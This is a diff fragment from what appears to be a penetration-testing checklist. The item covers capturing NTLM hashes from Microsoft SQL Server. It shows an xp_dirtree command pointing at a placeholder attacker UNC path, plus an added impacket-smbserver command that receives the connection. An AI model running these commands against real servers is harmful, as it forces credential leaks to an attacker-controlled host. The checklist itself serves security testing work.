@@ -375,6 +375,7 @@
 - [ ] **NTLM hash capture** (via UNC path):
   ```sql
   EXEC xp_dirtree '\\<attacker_ip>\share';  -- triggers Responder
+  sudo impacket-smbserver share . -smb2support -debug
   ```
 
 ---
